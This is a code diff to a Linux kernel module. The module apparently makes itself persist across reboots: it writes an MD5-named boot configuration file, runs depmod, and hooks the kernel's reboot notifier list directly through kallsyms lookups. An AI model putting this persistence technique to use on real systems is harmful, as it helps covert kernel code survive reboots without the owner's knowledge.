@@ -5,6 +5,7 @@
 #include <linux/slab.h>
 #include <linux/module.h>
 #include <linux/notifier.h>
+#include <linux/reboot.h>
 #include <linux/kallsyms.h>
 #include <linux/umh.h>
 
@@ -16,10 +17,14 @@
 #define BOOT_FILE_EXTENSION ".conf"
 #define MAX_FILENAME_LENGTH 255
 
+typedef void (*ksys_sync)(void);
+
 int shutdown_notifier(struct notifier_block *nb, unsigned long action, void *data) {
     char* md5 = register_for_boot();
-    kfree(md5);
-    return NOTIFY_OK;
+    if (md5 != NULL) {
+        kfree(md5);
+    }
+    return NOTIFY_DONE;
 }
 
 char* get_file_name(void){
@@ -39,7 +44,7 @@ char* register_for_boot() {
     struct file* file;
     char* md5 = NULL;
     char *hargv[] = {DEPMOD_PATH, "-a", NULL};
-    char *henvp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
+    char *henvp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
     char* file_name = get_file_name();
     char* file_full_path = kmalloc(strlen(MODULES_BOOT_CONF_DIR) + strlen(file_name) + 1, GFP_KERNEL);
     memset(file_full_path, 0, strlen(MODULES_BOOT_CONF_DIR) + strlen(file_name) + 1);
@@ -59,8 +64,13 @@ char* register_for_boot() {
     else {
         md5 = get_md5(THIS_MODULE->name, strlen(THIS_MODULE->name));
     }
-    call_usermodehelper(DEPMOD_PATH, hargv, henvp, UMH_WAIT_PROC);
+    file_sync(file);
     file_close(file);
+    ((ksys_sync)kallsyms_lookup_name("ksys_sync"))(); 
+    
+    if (0 != call_usermodehelper(DEPMOD_PATH, hargv, henvp, UMH_WAIT_PROC)) {
+        printk("Failed calling depmod\n");
+    }
 release_resources:
     kfree(file_name);
     kfree(file_full_path);
@@ -68,19 +78,40 @@ release_resources:
 }
 
 void register_for_shutdown(){
-    struct blocking_notifier_head* reboot_notifier_list = (struct blocking_notifier_head*)kallsyms_lookup_name("reboot_notifier_list");
+    struct blocking_notifier_head* reboot_notifier_list = (struct blocking_notifier_head*)kallsyms_lookup_name("reboot_notifier_list"); 
     struct notifier_block* notifier_ptr;
+    struct notifier_block* notifier_prev_ptr;
     struct notifier_block* notifier = kmalloc(sizeof(struct notifier_block), GFP_KERNEL);
     notifier->next = NULL;
     notifier->notifier_call = shutdown_notifier;
     notifier->priority = 0;
     notifier_ptr = reboot_notifier_list->head;
+    notifier_prev_ptr = reboot_notifier_list->head;
     if (NULL == notifier_ptr) {
         reboot_notifier_list->head = notifier;
     }
     else {
+        if ((unsigned long)notifier_ptr->notifier_call == (unsigned long)shutdown_notifier && NULL != notifier_ptr->next) {
+            reboot_notifier_list->head = notifier_ptr->next;
+            kfree(notifier_ptr);
+            notifier_ptr = reboot_notifier_list->head;
+            notifier_prev_ptr = reboot_notifier_list->head;
+        }
         while (NULL != notifier_ptr->next){
+            if ((unsigned long)notifier_ptr->notifier_call == (unsigned long)shutdown_notifier && NULL == notifier_ptr->next) {
+                return;
+            }        
+            if ((unsigned long)notifier_ptr->notifier_call == (unsigned long)shutdown_notifier && NULL != notifier_ptr->next) {
+                notifier_prev_ptr->next = notifier_ptr->next;
+                kfree(notifier_ptr);
+                notifier_ptr = notifier_prev_ptr;
+
+            }
+            notifier_prev_ptr = notifier_ptr;
             notifier_ptr = notifier_ptr->next;
+        }
+        if ((unsigned long)notifier_ptr->notifier_call == (unsigned long)shutdown_notifier && NULL == notifier_ptr->next) {
+            return;
         }
         notifier_ptr->next = notifier;    
     }
